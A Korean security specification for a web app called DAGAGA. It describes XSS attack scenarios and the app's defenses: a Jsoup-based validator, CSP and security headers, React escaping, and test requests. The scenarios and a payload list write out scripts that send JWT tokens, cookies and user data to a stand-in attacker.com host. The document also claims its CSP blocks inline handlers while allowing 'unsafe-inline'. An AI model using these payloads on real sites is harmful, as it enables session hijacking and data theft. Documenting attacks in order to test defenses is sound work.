# XSS 보안 명세

## 개요

본 문서는 DAGAGA 애플리케이션에 구현된 XSS(Cross-Site Scripting) 공격 방어 메커니즘을 설명합니다.

---

## 1. XSS 공격이란?

XSS(Cross-Site Scripting)는 공격자가 웹 애플리케이션에 악의적인 스크립트를 삽입하여, 다른 사용자의 브라우저에서 실행되도록 하는 공격입니다.

### 공격 유형

| 유형              | 설명                                               | 예시                 |
| ----------------- | -------------------------------------------------- | -------------------- |
| **Stored XSS**    | 악성 스크립트가 DB에 저장되어 다른 사용자에게 전파 | 댓글, 게시글, 프로필 |
| **Reflected XSS** | URL 파라미터를 통해 스크립트 실행                  | 검색어, 에러 메시지  |
| **DOM-based XSS** | 프론트엔드에서 DOM 조작 시 발생                    | innerHTML 직접 조작  |

본 애플리케이션은 주로 **Stored XSS** 위험이 높습니다.

---

## 2. 공격 시나리오

### 시나리오 1: 댓글을 통한 세션 탈취

#### 공격자의 행동

```javascript
// 공격자가 댓글에 작성
POST /api/v1/comments
{
  "postId": 123,
  "content": "좋은 글이네요! <script>
    // 현재 사용자의 JWT 토큰 탈취
    const token = localStorage.getItem('accessToken');
    // 공격자 서버로 전송
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ token: token })
    });
  </script>"
}
```

#### 방어 전 (취약한 경우)

1. 악성 스크립트가 DB에 그대로 저장됨
2. 다른 사용자가 댓글 조회
3. React에서 HTML로 렌더링
4. 스크립트 실행 → **JWT 토큰 탈취**
5. 공격자가 탈취한 토큰으로 사용자 계정 접근

#### 방어 후 (현재 구현)

```json
HTTP/1.1 400 Bad Request
{
  "status": 400,
  "message": "Validation failed",
  "errors": [
    {
      "field": "content",
      "message": "HTML 태그는 사용할 수 없습니다"
    }
  ]
}
```

→ **요청 차단, DB에 저장되지 않음** ✅

---

### 시나리오 2: 닉네임을 통한 악성 스크립트 삽입

#### 공격자의 행동

```javascript
POST /api/v1/users/signup
{
  "email": "attacker@example.com",
  "password": "Pass1234+",
  "nickname": "<img src=x onerror='
    document.location=\"https://attacker.com/steal?cookie=\"+document.cookie
  '>",
  "viewLangCode": "ko",
  "nativeLangCode": "ko"
}
```

#### 공격 목적

- 닉네임이 화면에 표시될 때마다 스크립트 실행
- 모든 사용자의 쿠키 정보 탈취

#### 방어 후 (현재 구현)

```json
HTTP/1.1 400 Bad Request
{
  "errors": [
    {
      "field": "nickname",
      "message": "HTML 태그는 사용할 수 없습니다"
    }
  ]
}
```

→ **회원가입 실패, 악성 닉네임 차단** ✅

---

### 시나리오 3: 채팅을 통한 실시간 공격

#### 공격자의 행동

```javascript
// WebSocket으로 채팅 메시지 전송
{
  "roomId": 1,
  "originalText": "안녕하세요 <script>
    // 채팅방의 모든 사용자 공격
    const users = document.querySelectorAll('.user-info');
    users.forEach(u => {
      fetch('https://attacker.com/track', {
        method: 'POST',
        body: JSON.stringify({
          userId: u.dataset.userId,
          location: window.location.href
        })
      });
    });
  </script>"
}
```

#### 공격 효과 (방어 전)

- 채팅방의 **모든 사용자**에게 실시간 전파
- 사용자 추적, 세션 하이재킹 가능

#### 방어 후 (현재 구현)

```json
HTTP/1.1 400 Bad Request
{
  "errors": [
    {
      "field": "originalText",
      "message": "HTML 태그는 사용할 수 없습니다"
    }
  ]
}
```

→ **메시지 전송 차단, 채팅방 안전** ✅

---

## 3. 구현된 방어 메커니즘

### 3.1 백엔드: 입력 검증 (Primary Defense)

#### @NoHtml Custom Validator

**위치:** [`NoHtml.java`](../backend/dagaga/domain/src/main/java/com/dagaga/domain/common/validation/NoHtml.java)

```java
@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = NoHtmlValidator.class)
public @interface NoHtml {
    String message() default "HTML 태그는 허용되지 않습니다";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}
```

**구현체:** [`NoHtmlValidator.java`](../backend/dagaga/domain/src/main/java/com/dagaga/domain/common/validation/NoHtmlValidator.java)

```java
public class NoHtmlValidator implements ConstraintValidator<NoHtml, String> {

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (value == null || value.isEmpty()) {
            return true;
        }

        // Jsoup으로 HTML 태그 제거
        String sanitized = Jsoup.clean(value, Safelist.none());

        // 원본과 비교
        return value.equals(sanitized);
    }
}
```

**작동 원리:**

1. 사용자 입력 → Controller 진입
2. `@Valid` 어노테이션이 `@NoHtml` 검증 트리거
3. Jsoup이 HTML 태그 제거 시도
4. 원본 ≠ 새니타이즈 결과 → **검증 실패**
5. 400 Bad Request 반환

---

### 3.2 적용 범위

| DTO                      | 필드             | 검증 내용 | 최대 길이 |
| ------------------------ | ---------------- | --------- | --------- |
| **CommentCreateRequest** | `content`        | @NoHtml   | 1,000자   |
| **UserRegisterDto**      | `nickname`       | @NoHtml   | 20자      |
| **SocialSignupDto**      | `nickname`       | @NoHtml   | 20자      |
| **UserUpdateDto**        | `nickname`       | @NoHtml   | 20자      |
| **SendMessageRequest**   | `originalText`   | @NoHtml   | 2,000자   |
| **SendMessageRequest**   | `translatedText` | @NoHtml   | 2,000자   |

**사용 예시:**

```java
// CommentCreateRequest.java
public class CommentCreateRequest {
    @NotBlank(message = "댓글 내용은 필수입니다.")
    @Size(max = 1000, message = "댓글은 1000자를 초과할 수 없습니다")
    @NoHtml(message = "HTML 태그는 사용할 수 없습니다")
    private String content;
}
```

---

### 3.3 HTTP 보안 헤더 (Secondary Defense)

**위치:** [`SecurityConfig.java`](../backend/dagaga/app/src/main/java/com/dagaga/security/config/SecurityConfig.java)

```java
.headers(headers -> headers
    // 1. XSS Protection
    .xssProtection(xss -> xss.headerValue("1; mode=block"))

    // 2. Content-Type Options
    .contentTypeOptions(contentType -> {})

    // 3. Frame Options
    .frameOptions(frame -> frame.deny())

    // 4. Content Security Policy
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' 'unsafe-inline' https://accounts.google.com; " +
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
            "font-src 'self' https://fonts.gstatic.com; " +
            "img-src 'self' data: https:; " +
            "connect-src 'self' https://api.example.io;"
        ))
)
```

#### 헤더별 설명

| 헤더                        | 값              | 효과                                      |
| --------------------------- | --------------- | ----------------------------------------- |
| **X-XSS-Protection**        | `1; mode=block` | 브라우저가 XSS 감지 시 페이지 렌더링 차단 |
| **X-Content-Type-Options**  | `nosniff`       | MIME 타입 변조 방지                       |
| **X-Frame-Options**         | `DENY`          | iframe 삽입 차단 (Clickjacking 방어)      |
| **Content-Security-Policy** | 정책 문자열     | 허용된 리소스만 로드                      |

#### CSP 정책 상세

| 지시자        | 허용 대상                                                 | 설명                                |
| ------------- | --------------------------------------------------------- | ----------------------------------- |
| `default-src` | `'self'`                                                  | 기본적으로 같은 도메인만 허용       |
| `script-src`  | `'self'` `'unsafe-inline'` `https://accounts.google.com`  | 자체 + Google OAuth 스크립트만 실행 |
| `style-src`   | `'self'` `'unsafe-inline'` `https://fonts.googleapis.com` | 자체 + Google Fonts 스타일만 허용   |
| `font-src`    | `'self'` `https://fonts.gstatic.com`                      | 자체 + Google 폰트만 허용           |
| `img-src`     | `'self'` `data:` `https:`                                 | 자체 + HTTPS 이미지 허용            |
| `connect-src` | `'self'` `https://api.example.io`                         | 자체 + 번역 API만 연결              |

**효과:**

- 외부 악성 스크립트 로드 차단
- 인라인 이벤트 핸들러(`onclick` 등) 차단
- 신뢰할 수 있는 도메인만 허용

---

### 3.4 프론트엔드: React 자동 이스케이핑

React는 기본적으로 모든 출력을 HTML 이스케이핑합니다:

```jsx
// 안전: React가 자동으로 이스케이핑
<div>{msg.text}</div>
// 렌더링: "&lt;script&gt;alert('XSS')&lt;/script&gt;"

// 위험: 사용하지 않음
<div dangerouslySetInnerHTML={{ __html: msg.text }} />
```

**확인 결과:**

- ✅ `dangerouslySetInnerHTML` 사용 없음
- ✅ `innerHTML` 직접 조작 없음

---

## 4. 테스트 가이드

### 4.1 수동 테스트 (Postman)

#### 테스트 1: 댓글 XSS 차단

**요청:**

```bash
curl -X POST https://i14b110.p.example.io/api/v1/comments \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "postId": 1,
    "content": "좋은 글이네요 <script>alert(\"XSS\")</script>"
  }'
```

**예상 응답:**

```json
{
  "status": 400,
  "errors": [
    {
      "field": "content",
      "message": "HTML 태그는 사용할 수 없습니다"
    }
  ]
}
```

#### 테스트 2: 닉네임 XSS 차단

**요청:**

```bash
curl -X POST https://i14b110.p.example.io/api/v1/users/signup \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "password": "Test1234+",
    "nickname": "<img src=x onerror=alert(1)>",
    "viewLangCode": "ko",
    "nativeLangCode": "ko"
  }'
```

**예상 응답:**

```json
{
  "status": 400,
  "errors": [
    {
      "field": "nickname",
      "message": "HTML 태그는 사용할 수 없습니다"
    }
  ]
}
```

#### 테스트 3: HTTP 헤더 확인

**요청:**

```bash
curl -I https://i14b110.p.example.io/api/v1/posts
```

**예상 헤더:**

```
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'...
```

---

### 4.2 자동화 테스트 (Unit Test)

**테스트 파일 예시:**

```java
@Test
void noHtml_shouldReject_scriptTag() {
    // given
    String maliciousInput = "안녕하세요<script>alert('XSS')</script>";

    // when
    boolean isValid = validator.isValid(maliciousInput, context);

    // then
    assertThat(isValid).isFalse();
}

@Test
void noHtml_shouldAccept_plainText() {
    // given
    String safeInput = "안녕하세요";

    // when
    boolean isValid = validator.isValid(safeInput, context);

    // then
    assertThat(isValid).isTrue();
}
```

---

## 5. XSS 공격 페이로드 예시

### 일반적인 공격 패턴

```html
<!-- Basic Script Injection -->
<script>alert('XSS')</script>

<!-- Event Handler -->
<img src=x onerror=alert('XSS')>

<!-- Encoded Script -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

<!-- SVG -->
<svg onload=alert('XSS')>

<!-- iframe -->
<iframe src="javascript:alert('XSS')"></iframe>

<!-- HTML Entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Style -->
<style>@import'http://attacker.com/xss.css';</style>
```

**현재 구현:** 위 모든 패턴 차단됨 ✅

---

## 6. 제한 사항

### 현재 제한 사항

1. **`'unsafe-inline'` 허용**
   - CSP에서 인라인 스크립트 허용
   - 보안 수준을 약간 낮춤
   - **개선 방안:** Nonce 기반 CSP로 전환

2. **Rich Text 불가능**
   - HTML 태그 완전 차단
   - 볼드, 이탤릭 등 서식 사용 불가
   - **개선 방안:** Markdown 지원 또는 제한된 HTML 태그 허용

3. **번역 API 응답 검증 없음**
   - 번역된 텍스트는 검증하지만, 번역 API 자체는 신뢰
   - **개선 방안:** 번역 API 응답도 새니타이즈

---

## 7. 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Jsoup Documentation](https://jsoup.org/cookbook/cleaning-html/safelist-sanitizer)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Spring Security Headers Reference](https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html)

---

**문서 작성일:** 2026-02-08  
**최종 수정:** 2026-02-08  
**작성자:** Backend Team  
**버전:** 1.0
